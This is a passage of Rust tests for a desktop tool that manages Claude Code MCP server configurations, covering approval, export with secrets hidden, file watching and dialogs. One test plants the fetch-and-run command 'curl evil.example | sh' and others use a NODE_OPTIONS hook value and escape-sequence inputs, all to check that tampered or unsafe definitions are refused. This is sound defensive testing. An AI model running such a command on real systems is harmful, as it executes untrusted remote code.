        let (result, _) = forgotten(&core, &sso);
        assert!(result.unwrap_err().contains("uses"));
        assert!(store.get(&sso).unwrap().is_some());
    }

    #[test]
    fn a_store_that_cannot_be_used_is_said_only_when_a_server_needs_it() {
        let store = Arc::new(crate::secrets::MemoryStore::default());
        *store.fail.lock().unwrap() = Some(crate::secrets::SecretError::Unavailable(
            "no Secret Service".into(),
        ));
        let env = secrets_env();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let report = secrets_report(&core);
        assert!(
            report
                .store_problem
                .as_deref()
                .is_some_and(|p| p.contains("no Secret Service")),
            "{report:?}"
        );
        assert!(
            report
                .servers
                .iter()
                .flat_map(|s| &s.uses)
                .any(|u| u.place == crate::secret_uses::Place::Store(None))
        );
        // Variant: nothing signs in with OAuth, so the store does not matter here.
        let env = quiet_env(&serde_json::json!({
            "mcpServers": {"gh": {"command": "npx", "env": {"GITHUB_TOKEN": "${GITHUB_TOKEN}"}}}
        }));
        let core = with_store(&env, store);
        collect(&core, |e| !snapshots(e).is_empty());
        let report = secrets_report(&core);
        assert_eq!(report.store_problem, None);
        assert_eq!(report.servers.len(), 1);
    }

    /// Every file's text under `dir`, to look for a value that must not be there.
    fn walk(dir: &Path) -> String {
        let mut out = String::new();
        for entry in std::fs::read_dir(dir).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                out.push_str(&walk(&path));
            } else {
                out.push_str(&String::from_utf8_lossy(
                    &std::fs::read(&path).unwrap_or_default(),
                ));
            }
        }
        out
    }

    // ---- approving a project server

    const MCP_JSON: &str = r#"{"mcpServers":{"ps":{"type":"stdio","command":"node","args":["server.js","--port","9"],"env":{"NODE_OPTIONS":"--require ./hook.js"}}}}"#;

    /// A repository with a `.mcp.json`, known to Claude as a project. Returns the environment, the project key as
    /// the inventory spells it, and the repository path.
    fn repo_env(claude_entry: serde_json::Value) -> (Env, String, PathBuf) {
        let env = quiet_env(&serde_json::json!({}));
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        std::fs::write(repo.join(".mcp.json"), MCP_JSON).unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(
            &env,
            &serde_json::json!({"numStartups": 1, "projects": {key.clone(): claude_entry}}),
        );
        // The key as written: ids are made from the file's spellings, whatever normalising would make of them.
        (env, key, repo)
    }

    fn project_id(key: &str, name: &str) -> ServerId {
        ServerId::new(Scope::Project, Some(key), name)
    }

    fn approve(key: &str) -> Vec<Change> {
        vec![Change::Approve {
            id: project_id(key, "ps"),
        }]
    }

    fn settings_of(repo: &Path) -> Option<serde_json::Value> {
        std::fs::read_to_string(repo.join(".claude").join("settings.local.json"))
            .ok()
            .map(|t| serde_json::from_str(&t).unwrap())
    }

    fn apply_and_wait(core: &Core, plan: &PlanView) -> Vec<Event> {
        core.send(Command::Apply(plan.id));
        collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        })
    }

    /// The verify that runs shortly after a write (50 ms in tests) reports no failure.
    fn verify_passes(core: &Core) {
        std::thread::sleep(Duration::from_millis(400));
        let mut late = Vec::new();
        while let Some(e) = core.try_recv() {
            late.push(e);
        }
        assert!(
            !late.iter().any(|e| matches!(e, Event::ApplyFailed { .. })),
            "{late:#?}"
        );
    }

    #[test]
    fn the_plan_shows_everything_the_server_would_run_and_writes_nothing_yet() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert_eq!(plan.reviews.len(), 1);
        assert_eq!(
            plan.reviews[0].lines,
            [
                "Command: node",
                "Argument 1: server.js",
                "Argument 2: --port",
                "Argument 3: 9",
                "Environment: NODE_OPTIONS=--require ./hook.js",
            ]
        );
        assert!(plan.reviews[0].title.contains("ps"));
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("trust the repository")),
            "{:?}",
            plan.warnings
        );
        assert!(
            plan.warnings.iter().any(|w| w.contains(".gitignore")),
            "{:?}",
            plan.warnings
        );
        assert_eq!(plan.files.len(), 1);
        assert!(plan.files[0].path.ends_with("settings.local.json"));
        assert_eq!(plan.files[0].lines, ["  enabledMcpjsonServers", "+ ps"]);
        assert!(!repo.join(".claude").exists(), "preparing writes nothing");
    }

    #[test]
    fn approving_writes_only_the_settings_file_in_the_repository() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let claude_json_before =
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        let events = apply_and_wait(&core, &plan);
        assert!(
            events.iter().any(|e| matches!(
                e,
                Event::Applied {
                    changed: true,
                    backup: None,
                    ..
                }
            )),
            "{events:#?}"
        );
        assert_eq!(
            settings_of(&repo),
            Some(serde_json::json!({"enabledMcpjsonServers": ["ps"]}))
        );
        // Nothing else in the repository, and no lock left behind.
        let mut top: Vec<_> = std::fs::read_dir(&repo)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        top.sort();
        assert_eq!(top, [".claude", ".mcp.json"]);
        let inner: Vec<_> = std::fs::read_dir(repo.join(".claude"))
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(inner, ["settings.local.json"]);
        assert_eq!(
            std::fs::read_to_string(repo.join(".mcp.json")).unwrap(),
            MCP_JSON
        );
        // The user's own file was not touched, so there is no backup of it either.
        assert_eq!(
            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
            claude_json_before
        );
        assert_eq!(approval_in(&events), Some(crate::api::Approval::Approved));
    }

    /// The approval of `ps` in the last snapshot among `events`.
    fn approval_in(events: &[Event]) -> Option<crate::api::Approval> {
        events.iter().rev().find_map(|e| match e {
            Event::Snapshot(s) => s
                .servers
                .iter()
                .find(|r| r.name == "ps")
                .and_then(|r| r.approval),
            _ => None,
        })
    }

    #[test]
    fn approving_a_server_that_was_rejected_clears_the_rejection_in_both_places() {
        let (env, key, repo) =
            repo_env(serde_json::json!({"disabledMcpjsonServers": ["ps", "other"]}));
        std::fs::create_dir_all(repo.join(".claude")).unwrap();
        std::fs::write(
            repo.join(".claude").join("settings.local.json"),
            r#"{"disabledMcpjsonServers":["ps"],"keep":true}"#,
        )
        .unwrap();
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert_eq!(
            plan.files.len(),
            2,
            "the settings file and ~/.claude.json: {:?}",
            plan.files
        );
        let events = apply_and_wait(&core, &plan);
        assert_eq!(
            settings_of(&repo),
            Some(
                serde_json::json!({"disabledMcpjsonServers": [], "keep": true, "enabledMcpjsonServers": ["ps"]})
            )
        );
        assert_eq!(
            config_json(&env)["projects"][&key]["disabledMcpjsonServers"],
            serde_json::json!(["other"])
        );
        assert_eq!(approval_in(&events), Some(crate::api::Approval::Approved));
    }

    #[test]
    fn a_server_that_is_already_approved_needs_nothing() {
        let (env, key, repo) = repo_env(serde_json::json!({"enabledMcpjsonServers": ["ps"]}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert!(plan.nothing_to_do && plan.reviews.is_empty() && plan.warnings.is_empty());
        apply_and_wait(&core, &plan);
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn a_definition_edited_after_review_is_not_approved() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        std::fs::write(
            repo.join(".mcp.json"),
            MCP_JSON.replace("\"node\"", "\"curl evil.example | sh\""),
        )
        .unwrap();
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .expect("refused");
        assert!(
            error.contains("changed") && error.contains("review it again"),
            "{error}"
        );
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn a_server_removed_after_review_is_not_approved_either() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        std::fs::remove_file(repo.join(".mcp.json")).unwrap();
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::ApplyFailed { .. }))
        );
        assert!(!repo.join(".claude").exists());
    }

    #[test]
    fn a_server_that_cannot_be_shown_whole_is_not_offered_for_approval() {
        for definition in [
            r#"{"command":"no\u001b[2Kde"}"#,
            r#"{"command":"node","args":["a\u202eb"]}"#,
            r#"{"type":"carrier-pigeon"}"#,
            r#"{"command":"node","args":[1]}"#,
        ] {
            let (env, key, repo) = repo_env(serde_json::json!({}));
            std::fs::write(
                repo.join(".mcp.json"),
                format!(r#"{{"mcpServers":{{"ps":{definition}}}}}"#),
            )
            .unwrap();
            let core = env.start();
            core.send(Command::Prepare(approve(&key)));
            let events = collect(&core, |e| {
                e.iter()
                    .any(|x| matches!(x, Event::PlanFailed(_) | Event::PlanReady(_)))
            });
            assert!(
                events.iter().any(
                    |e| matches!(e, Event::PlanFailed(m) if m.contains("cannot be reviewed safely"))
                ),
                "{definition}: {events:#?}"
            );
            assert!(!repo.join(".claude").exists());
        }
    }

    #[test]
    fn only_project_servers_can_be_approved() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        core.send(Command::Prepare(vec![Change::Approve {
            id: user_id("gw"),
        }]));
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::PlanFailed(m) if m.contains("needs no approval")))
        );
    }

    #[test]
    fn the_ignore_warning_goes_away_when_the_repository_ignores_the_file() {
        let (env, key, repo) = repo_env(serde_json::json!({}));
        std::fs::write(repo.join(".gitignore"), ".claude/settings.local.json\n").unwrap();
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        assert!(
            !plan.warnings.iter().any(|w| w.contains(".gitignore")),
            "{:?}",
            plan.warnings
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("trust the repository"))
        );
    }

    #[test]
    fn a_failure_after_the_first_file_says_what_was_already_saved() {
        let (env, key, repo) = repo_env(serde_json::json!({"disabledMcpjsonServers": ["ps"]}));
        let core = env.start();
        let plan = plan_for(&core, approve(&key));
        // Claude holds its lock, so the second file (~/.claude.json) cannot be written.
        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap();
        assert!(
            error.contains("writing its configuration")
                && error.contains("Already saved")
                && error.contains("settings.local.json"),
            "{error}"
        );
        assert_eq!(
            settings_of(&repo),
            Some(serde_json::json!({"enabledMcpjsonServers": ["ps"]}))
        );
        // The rejection in ~/.claude.json is still there, so the server is still shown as rejected.
        assert_eq!(
            config_json(&env)["projects"][&key]["disabledMcpjsonServers"],
            serde_json::json!(["ps"])
        );
    }

    /// Approves `ps` with a slow after-save check, then, before that check, puts the settings file back as it was
    /// and holds its lock, so the check of that file (the first of the two) fails.
    fn approve_then_fail_the_settings_check(
        claude_entry: serde_json::Value,
    ) -> (Env, Core, String, PathBuf) {
        let (env, key, repo) = repo_env(claude_entry);
        let core = start_with(
            EngineConfig {
                verify_delay: Duration::from_millis(800),
                ..env.config()
            },
            || {},
        );
        let plan = plan_for(&core, approve(&key));
        assert!(
            plan.files[0].path.contains("settings.local.json"),
            "the settings file is checked first: {:?}",
            plan.files
        );
        let events = apply_and_wait(&core, &plan);
        assert!(events.iter().any(|e| matches!(e, Event::Applied { .. })));
        let settings = repo.join(".claude").join("settings.local.json");
        std::fs::write(&settings, "{}").unwrap();
        std::fs::create_dir(repo.join(".claude").join("settings.local.json.lock")).unwrap();
        (env, core, key, repo)
    }

    #[test]
    fn a_file_whose_after_save_check_fails_does_not_stop_the_next_file_being_checked() {
        let (env, core, key, _repo) = approve_then_fail_the_settings_check(
            serde_json::json!({"disabledMcpjsonServers": ["ps", "other"]}),
        );
        // Claude saves an older copy of its configuration without taking the lock.
        let mut config = config_json(&env);
        config["projects"][&key]["disabledMcpjsonServers"] = serde_json::json!(["ps", "other"]);
        write_config(&env, &config);
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        let deadline = Instant::now() + WAIT;
        while config_json(&env)["projects"][&key]["disabledMcpjsonServers"]
            != serde_json::json!(["other"])
        {
            assert!(
                Instant::now() < deadline,
                "~/.claude.json was not checked: {}",
                config_json(&env)["projects"][&key]
            );
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    #[test]
    fn after_save_check_failures_name_their_files_once_each() {
        // Cross-review of #14: two files failing the same way read as one sentence twice, naming neither.
        let (env, core, key, _repo) = approve_then_fail_the_settings_check(
            serde_json::json!({"disabledMcpjsonServers": ["ps", "other"]}),
        );
        let mut config = config_json(&env);
        config["projects"][&key]["disabledMcpjsonServers"] = serde_json::json!(["ps", "other"]);
        write_config(&env, &config);
        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap();
        assert!(
            error.contains("settings.local.json") && error.contains(".claude.json"),
            "{error}"
        );
        assert_eq!(error.matches("writing").count(), 1, "{error}");
        assert!(
            !error.contains("Nothing was changed"),
            "the change was saved; only the check after it failed: {error}"
        );
    }

    #[test]
    fn a_change_after_a_failed_check_does_not_replay_the_earlier_one() {
        // The variant: ~/.claude.json was fine, but its log was never retired. The user then rejects the server
        // again in Claude Code, and the next change of anything in that file put the approval back.
        let (env, core, key, _repo) = approve_then_fail_the_settings_check(
            serde_json::json!({"disabledMcpjsonServers": ["ps", "other"]}),
        );
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::ApplyFailed { .. }))
        });
        let mut config = config_json(&env);
        config["projects"][&key]["disabledMcpjsonServers"] = serde_json::json!(["ps", "other"]);
        write_config(&env, &config);
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Snapshot(s)
                if s.servers.iter().any(|r| r.name == "ps" && r.approval == Some(crate::api::Approval::Rejected))))
        });
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: project_id(&key, "ps"),
                enabled: false,
            }],
        );
        apply_and_wait(&core, &plan);
        // Past the slow after-save check.
        std::thread::sleep(Duration::from_millis(1500));
        let entry = &config_json(&env)["projects"][&key];
        assert_eq!(entry["disabledMcpServers"], serde_json::json!(["ps"]));
        assert_eq!(
            entry["disabledMcpjsonServers"],
            serde_json::json!(["ps", "other"]),
            "the rejection made in Claude Code was undone"
        );
    }

    // ---- not spawning what is not needed

    impl Env {
        /// How many times the fake CLI was started with these leading arguments.
        fn runs(&self, leading: &[&str]) -> usize {
            std::fs::read_to_string(&self.log)
                .unwrap_or_default()
                .lines()
                .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
                .filter(|l| l["event"] == "start")
                .filter(|l| {
                    let argv = l["argv"].as_array().unwrap();
                    argv.len() >= leading.len()
                        && leading.iter().zip(argv).all(|(want, got)| got == want)
                })
                .count()
        }
    }

    const CHECKABLE: &str = r#"{"rules":[
        {"args":["--version"],"stdout_file":"version.txt"},
        {"args":["mcp","get"],"stdout_file":"connected.txt"}]}"#;

    fn checkable_env(claude_json: &serde_json::Value) -> Env {
        Env::new(
            claude_json,
            CHECKABLE,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("connected.txt", CONNECTED),
            ],
        )
    }

    #[test]
    fn the_cli_version_is_asked_once_not_on_every_refresh() {
        let env = checkable_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
                && final_status(e, "gw").is_some()
        });
        for _ in 0..3 {
            core.send(Command::Refresh { live_all: false });
            collect(&core, |e| {
                e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
            });
        }
        assert_eq!(env.runs(&["--version"]), 1);
    }

    #[test]
    fn a_failed_version_ask_is_tried_again_on_the_next_refresh() {
        // A first run can fail for reasons that pass (a virus scan on first start, a timeout); it is not an answer.
        let env = Env::new(
            &two_projects("end"),
            r#"{"rules":[{"args":["--version"],"exit_code":1}]}"#,
            &[],
        );
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::CliVersion(None)))
        });
        core.send(Command::Refresh { live_all: false });
        collect(&core, |_| env.runs(&["--version"]) == 2);
    }

    /// `gw` (user) and `loc` (local, in a project folder that exists), both checkable. Returns the project key.
    fn checkable_with_project(loc_off: bool) -> (Env, String) {
        let env = checkable_env(&serde_json::json!({}));
        let project = env.dir.path().join("proj");
        std::fs::create_dir_all(&project).unwrap();
        let key = project.to_string_lossy().replace('\\', "/");
        let disabled: Vec<&str> = if loc_off { vec!["loc"] } else { vec![] };
        write_config(
            &env,
            &serde_json::json!({
                "mcpServers": {"gw": {"type": "stdio", "command": "node"}},
                "projects": {key.clone(): {
                    "mcpServers": {"loc": {"type": "stdio", "command": "x"}},
                    "disabledMcpServers": disabled
                }}
            }),
        );
        let key = inventory::normalise_project(&key);
        (env, key)
    }

    #[test]
    fn saving_a_change_neither_re_checks_servers_nor_asks_the_version_again() {
        let (env, key) = checkable_with_project(false);
        let core = env.start();
        collect(&core, |e| {
            final_status(e, "gw") == Some(Status::Connected)
                && final_status(e, "loc") == Some(Status::Connected)
        });
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", &key),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        // Give a stray check time to start, if one were queued.
        std::thread::sleep(Duration::from_millis(400));
        assert_eq!(env.runs(&["mcp", "get", "gw"]), 1, "gw did not change");
        assert_eq!(env.runs(&["mcp", "get", "loc"]), 1, "loc was switched off");
        assert_eq!(env.runs(&["--version"]), 1);
    }

    #[test]
    fn a_server_switched_on_by_a_change_is_checked() {
        let (env, key) = checkable_with_project(true);
        let core = env.start();
        collect(&core, |e| final_status(e, "gw") == Some(Status::Connected));
        assert_eq!(
            env.runs(&["mcp", "get", "loc"]),
            0,
            "off servers are not checked"
        );
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", &key),
                enabled: true,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| final_status(e, "loc") == Some(Status::Connected));
        assert_eq!(env.runs(&["mcp", "get", "loc"]), 1);
        assert_eq!(env.runs(&["mcp", "get", "gw"]), 1);
        assert_eq!(env.runs(&["--version"]), 1);
    }

    // ---- the file watcher

    fn snapshots(events: &[Event]) -> Vec<&Snapshot> {
        events
            .iter()
            .filter_map(|e| match e {
                Event::Snapshot(s) => Some(&**s),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn a_server_added_from_outside_appears_without_a_refresh() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let mut changed = two_projects("end");
        changed["mcpServers"]["added"] =
            serde_json::json!({"type": "http", "url": "https://x.example/mcp"});
        write_config(&env, &changed);
        collect(&core, |e| {
            snapshots(e)
                .iter()
                .any(|s| s.servers.iter().any(|r| r.name == "added"))
        });
    }

    #[test]
    fn a_new_mcp_json_in_a_known_project_appears_without_a_refresh() {
        let env = quiet_env(&serde_json::json!({}));
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(&env, &serde_json::json!({"projects": {key: {}}}));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        std::fs::write(repo.join(".mcp.json"), MCP_JSON).unwrap();
        collect(&core, |e| {
            snapshots(e).iter().any(|s| {
                s.servers
                    .iter()
                    .any(|r| r.name == "ps" && r.scope == Scope::Project)
            })
        });
    }

    #[test]
    fn klefki_s_own_save_is_read_once_not_again_by_the_watcher() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        let mut events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        // Several watch intervals and the settle time pass.
        std::thread::sleep(Duration::from_millis(600));
        while let Some(e) = core.try_recv() {
            events.push(e);
        }
        assert_eq!(snapshots(&events).len(), 1, "one reload after the save");
    }

    #[test]
    fn nothing_is_read_again_while_nothing_changes() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        std::thread::sleep(Duration::from_millis(600));
        let mut later = Vec::new();
        while let Some(e) = core.try_recv() {
            later.push(e);
        }
        assert!(snapshots(&later).is_empty(), "{later:#?}");
    }

    // ---- delete and edit

    fn entry_of(core: &Core, id: ServerId) -> (Result<String, String>, bool) {
        core.send(Command::Inspect(id.clone()));
        let events = collect(core, |e| e.iter().any(|x| matches!(x, Event::Entry { .. })));
        events
            .into_iter()
            .find_map(|e| match e {
                Event::Entry {
                    id: got,
                    json,
                    editable,
                } if got == id => Some((json, editable)),
                _ => None,
            })
            .unwrap()
    }

    fn plan_failure(core: &Core, changes: Vec<Change>) -> String {
        core.send(Command::Prepare(changes));
        let events = collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::PlanFailed(_) | Event::PlanReady(_)))
        });
        events
            .into_iter()
            .find_map(|e| match e {
                Event::PlanFailed(m) => Some(m),
                _ => None,
            })
            .expect("the plan was refused")
    }

    #[test]
    fn a_definition_is_shown_with_secrets_hidden() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let (json, editable) = entry_of(&core, user_id("gw"));
        let json = json.unwrap();
        assert!(editable);
        assert!(
            json.contains("<hidden>") && !json.contains("s3cret-value"),
            "{json}"
        );
        assert!(json.contains("\"command\": \"node\""), "{json}");
        let (gone, _) = entry_of(&core, user_id("ghost"));
        assert!(gone.is_err());
    }

    fn exported(core: &Core, ids: Vec<ServerId>) -> crate::export::Exported {
        core.send(Command::Export(ids));
        collect(core, |e| e.iter().any(|x| matches!(x, Event::Exported(_))))
            .into_iter()
            .find_map(|e| match e {
                Event::Exported(out) => Some(out),
                _ => None,
            })
            .unwrap()
    }

    #[test]
    fn an_export_reads_each_server_from_its_own_file_in_the_order_asked() {
        let (env, key, _repo) = repo_env(serde_json::json!({
            "mcpServers": {"loc": {"type": "stdio", "command": "x", "env": {"K": "v-12345678"}}}
        }));
        let claude_json_before =
            std::fs::read(env.dir.path().join("cfg").join(".claude.json")).unwrap();
        let core = env.start();
        let out = exported(
            &core,
            vec![
                project_id(&key, "ps"),
                local_id("loc", &key),
                user_id("gone"),
            ],
        );
        let block: serde_json::Value = serde_json::from_str(&out.text).unwrap();
        let servers = block["mcpServers"].as_object().unwrap();
        assert_eq!(servers.keys().collect::<Vec<_>>(), ["ps", "loc"]);
        assert_eq!(servers["ps"]["command"], "node");
        assert_eq!(
            servers["ps"]["env"],
            serde_json::json!({"NODE_OPTIONS": "${NODE_OPTIONS}"})
        );
        assert_eq!(servers["loc"]["env"], serde_json::json!({"K": "${K}"}));
        assert!(!out.text.contains("v-12345678"), "{}", out.text);
        assert_eq!(
            out.notes,
            ["Left out gone: it is no longer in the configuration."]
        );
        // Reading is all it does.
        assert_eq!(
            std::fs::read(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
            claude_json_before
        );
    }

    fn first_event<T>(core: &Core, pick: impl Fn(&Event) -> Option<T>) -> T {
        collect(core, |e| e.iter().any(|x| pick(x).is_some()))
            .iter()
            .find_map(pick)
            .unwrap()
    }

    /// A window as the UI hands it over. Its handles are not there (as for a window not shown yet), which is all a
    /// test can give without one.
    struct Window;

    impl raw_window_handle::HasWindowHandle for Window {
        fn window_handle(
            &self,
        ) -> Result<raw_window_handle::WindowHandle<'_>, raw_window_handle::HandleError> {
            Err(raw_window_handle::HandleError::Unavailable)
        }
    }

    impl raw_window_handle::HasDisplayHandle for Window {
        fn display_handle(
            &self,
        ) -> Result<raw_window_handle::DisplayHandle<'_>, raw_window_handle::HandleError> {
            Err(raw_window_handle::HandleError::Unavailable)
        }
    }

    #[test]
    fn the_save_dialog_opens_over_the_window_where_it_lives_and_its_answer_is_awaited_elsewhere() {
        let env = Env::new(&serde_json::json!({}), "{}", &[]);
        let opened: Arc<Mutex<Vec<(String, bool, std::thread::ThreadId)>>> = Arc::default();
        let (answer, user) = mpsc::channel::<Option<PathBuf>>();
        let user = Arc::new(Mutex::new(user));
        let mut config = env.config();
        config.open_dialog = {
            let opened = Arc::clone(&opened);
            Arc::new(move |name, owner| {
                lock(&opened).push((
                    name.to_owned(),
                    owner.is_some(),
                    std::thread::current().id(),
                ));
                let user = Arc::clone(&user);
                // The user answers when the test says so.
                Box::pin(async move { lock(&user).recv().ok().flatten() })
            })
        };
        let core = start_with(config, || {});
        core.choose_export_file("github-mcp.json".into(), Some(&Window));
        // Opened here, on the thread that has the window, over it; and this thread did not wait for the user.
        assert_eq!(
            *lock(&opened),
            vec![(
                "github-mcp.json".to_owned(),
                true,
                std::thread::current().id()
            )]
        );
        let file = env.dir.path().join("home").join("github-mcp.json");
        answer.send(Some(file.clone())).unwrap();
        let chosen = first_event(&core, |e| match e {
            Event::ExportFileChosen(choice) => Some(choice.clone()),
            _ => None,
        });
        assert_eq!(chosen, crate::export_file::FileChoice::Chosen(file));

        // Nearby: a dialog with no window to belong to opens all the same, and closing it offers a path to type.
        core.choose_export_file("x.json".into(), None);
        assert_eq!(lock(&opened).last().map(|o| o.1), Some(false));
        answer.send(None).unwrap();
        let chosen = first_event(&core, |e| match e {
            Event::ExportFileChosen(choice) => Some(choice.clone()),
            _ => None,
        });
        assert!(
            matches!(
                &chosen,
                crate::export_file::FileChoice::NoDialog { suggested }
                    | crate::export_file::FileChoice::Cancelled { suggested }
                    if suggested.ends_with("x.json")
            ),
            "{chosen:?}"
        );

        // A command with no dialog opened by the UI opens none here, off the UI's thread (on macOS, AppKit is
        // main-thread only): a path is asked for instead.
        let before = lock(&opened).len();
        core.send(Command::ChooseExportFile {
            name: "y.json".into(),
            shown: None,
        });
        let chosen = first_event(&core, |e| match e {
            Event::ExportFileChosen(choice) => Some(choice.clone()),
            _ => None,
        });
        assert!(
            matches!(&chosen, crate::export_file::FileChoice::NoDialog { suggested } if suggested.ends_with("y.json")),
            "{chosen:?}"
        );
        assert_eq!(lock(&opened).len(), before);
    }

    #[test]
    fn the_open_dialog_opens_over_the_window_and_the_file_picked_is_read_elsewhere() {
        let env = Env::new(&serde_json::json!({}), "{}", &[]);
        let opened: Arc<Mutex<Vec<(bool, std::thread::ThreadId)>>> = Arc::default();
        let (answer, user) = mpsc::channel::<Option<PathBuf>>();
        let user = Arc::new(Mutex::new(user));
        let mut config = env.config();
        config.pick_dialog = {
            let opened = Arc::clone(&opened);
            Arc::new(move |owner| {
                lock(&opened).push((owner.is_some(), std::thread::current().id()));
                let user = Arc::clone(&user);
                Box::pin(async move { lock(&user).recv().ok().flatten() })
            })
        };
        let core = start_with(config, || {});
        let file_of = |core: &Core| {
            first_event(core, |e| match e {
                Event::ImportFile(file) => Some(file.clone()),
                _ => None,
            })
        };
        core.choose_import_file(Some(&Window));
        // Opened here, over the window, and this thread did not wait for the user.
        assert_eq!(*lock(&opened), vec![(true, std::thread::current().id())]);
        let file = env.dir.path().join("servers.json");
        std::fs::write(&file, "{\"mcpServers\": {}}").unwrap();
        answer.send(Some(file.clone())).unwrap();
        assert_eq!(
            file_of(&core),
            crate::import_file::ImportFile::Read {
                shown: "servers.json".into(),
                text: "{\"mcpServers\": {}}".into()
            }
        );

        // Nearby: closing the dialog reads nothing; without a dialog from the UI, none is opened here.
        core.choose_import_file(None);
        answer.send(None).unwrap();
        assert!(matches!(
            file_of(&core),
            crate::import_file::ImportFile::Cancelled | crate::import_file::ImportFile::NoDialog
        ));
        let before = lock(&opened).len();
        core.send(Command::ChooseImportFile { shown: None });
        assert_eq!(file_of(&core), crate::import_file::ImportFile::NoDialog);
        assert_eq!(lock(&opened).len(), before);
        // A path typed or dropped is read the same way.
        core.send(Command::ReadImportFile(file));
        assert!(matches!(
            file_of(&core),
            crate::import_file::ImportFile::Read { .. }
        ));

        // Nearby: a pipe typed as the path (it would wait for a writer) is refused, not waited on.
        #[cfg(unix)]
        {
            let pipe = env.dir.path().join("pipe.json");
            let made = std::process::Command::new("mkfifo")
                .arg(&pipe)
                .status()
                .unwrap();
            assert!(made.success());
            core.send(Command::ReadImportFile(pipe));
            assert!(matches!(
                file_of(&core),
                crate::import_file::ImportFile::Failed { .. }
            ));
        }
    }

    #[test]
    fn an_export_is_saved_where_the_user_chose_and_never_over_claudes_own_file() {
        let env = Env::new(&serde_json::json!({}), "{}", &[]);
        let core = env.start();
        let chosen = |core: &Core| {
            first_event(core, |e| match e {
                Event::ExportFileChosen(choice) => Some(choice.clone()),
                _ => None,
            })
        };
        let saved = |core: &Core| {
            first_event(core, |e| match e {
                Event::ExportSaved { shown, result, .. } => Some((shown.clone(), result.clone())),
                _ => None,
            })
        };
        // No dialog opened by the UI: a path to start from instead, and no dialog is opened here.
        core.send(Command::ChooseExportFile {
            name: "mcp-servers.json".into(),
            shown: None,
        });
        assert!(matches!(
            chosen(&core),
            crate::export_file::FileChoice::NoDialog { suggested } if suggested.ends_with("mcp-servers.json")
        ));
        let file = env.dir.path().join("home").join("servers.json");
